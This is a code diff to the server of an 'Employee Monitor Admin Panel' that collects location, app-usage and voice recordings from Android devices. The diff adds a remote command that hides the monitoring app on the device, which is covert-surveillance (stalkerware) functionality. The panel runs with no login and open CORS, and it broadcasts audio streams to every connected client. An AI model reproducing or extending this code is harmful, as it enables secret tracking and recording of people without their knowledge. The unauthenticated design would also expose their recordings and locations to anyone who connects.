@@ -3,24 +3,25 @@ const http           = require('http');
 const { Server }     = require('socket.io');
 const path           = require('path');
 const fs             = require('fs-extra');
-const moment         = require('moment');
 
+const IS_VERCEL = !!process.env.VERCEL;
 const app    = express();
 const server = http.createServer(app);
 const io     = new Server(server, {
     cors: { origin: '*', methods: ['GET','POST'] },
-    maxHttpBufferSize: 50e6  // 50 MB for audio
+    maxHttpBufferSize: 50e6,  // 50 MB for audio
+    transports: IS_VERCEL ? ['polling'] : ['polling', 'websocket']
 });
 
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 // ─── Directories ───────────────────────────────────────────────
-const DATA_DIR   = path.join(__dirname, 'data');
+const BASE_DIR   = IS_VERCEL ? '/tmp' : __dirname;
+const DATA_DIR   = path.join(BASE_DIR, 'data');
 const AUDIO_DIR  = path.join(DATA_DIR, 'audio');
 const LOGS_DIR   = path.join(DATA_DIR, 'logs');
-fs.ensureDirSync(DATA_DIR);
-fs.ensureDirSync(AUDIO_DIR);
-fs.ensureDirSync(LOGS_DIR);
+try { fs.ensureDirSync(DATA_DIR); fs.ensureDirSync(AUDIO_DIR); fs.ensureDirSync(LOGS_DIR); }
+catch(e) { console.warn('Dir creation warning:', e.message); }
 
 // ─── In-memory stores ──────────────────────────────────────────
 const employees    = new Map();   // employeeId → { info, socketId }
@@ -28,6 +29,7 @@ const locationLogs = new Map();   // employeeId → [ ...events ]
 const appUsageLogs = new Map();   // employeeId → [ ...events ]
 const voiceLogs    = new Map();   // employeeId → [ ...filenames ]
 const alertsLog    = [];          // global alerts
+const hiddenApps   = new Map();   // employeeId → boolean
 
 // ─── Middleware ────────────────────────────────────────────────
 app.use(express.json({ limit: '50mb' }));
@@ -53,6 +55,7 @@ app.get('/api/employees', (req, res) => {
             androidVersion: emp.info.androidVersion,
             online:       emp.online,
             lastSeen:     emp.lastSeen,
+            appHidden:    hiddenApps.get(id) || false,
             locationCount: (locationLogs.get(id) || []).length,
             voiceCount:   (voiceLogs.get(id) || []).length,
             appCount:     (appUsageLogs.get(id) || []).length
@@ -199,6 +202,24 @@ io.on('connection', (socket) => {
         io.emit('audio_stream', data);
     });
 
+    // ── App hidden status from device ──
+    socket.on('app_hidden_status', (data) => {
+        const { employeeId, hidden } = data;
+        hiddenApps.set(employeeId, hidden);
+        io.emit('app_hidden_changed', { employeeId, hidden });
+        addAlert('info', `App ${hidden ? 'hidden' : 'unhidden'} on device`, employeeId);
+    });
+
+    // ── Admin sends hide/unhide command ──
+    socket.on('admin_hide_app', (data) => {
+        const { employeeId, hide } = data;
+        // Forward to all connected sockets (the target device will filter by its own ID)
+        io.emit('command_hide_app', { employeeId, hide });
+        hiddenApps.set(employeeId, hide);
+        addAlert('info', `Admin ${hide ? 'hid' : 'unhid'} app for ${employeeId}`, employeeId);
+        io.emit('app_hidden_changed', { employeeId, hidden: hide });
+    });
+
     // ── Disconnect ──
     socket.on('disconnect', () => {
         if (socket.employeeId) {
@@ -247,12 +268,17 @@ async function appendToLog(employeeId, type, data) {
 
 // ─── Start ────────────────────────────────────────────────────
 
-server.listen(PORT, () => {
-    console.log(`
+if (!IS_VERCEL) {
+    server.listen(PORT, () => {
+        console.log(`
 ╔═══════════════════════════════════════╗
 ║  Employee Monitor Admin Panel         ║
 ║  http://localhost:${PORT}               ║
 ║  No login required                    ║
 ╚═══════════════════════════════════════╝
-    `);
-});
+        `);
+    });
+}
+
+// Export for Vercel
+module.exports = app;
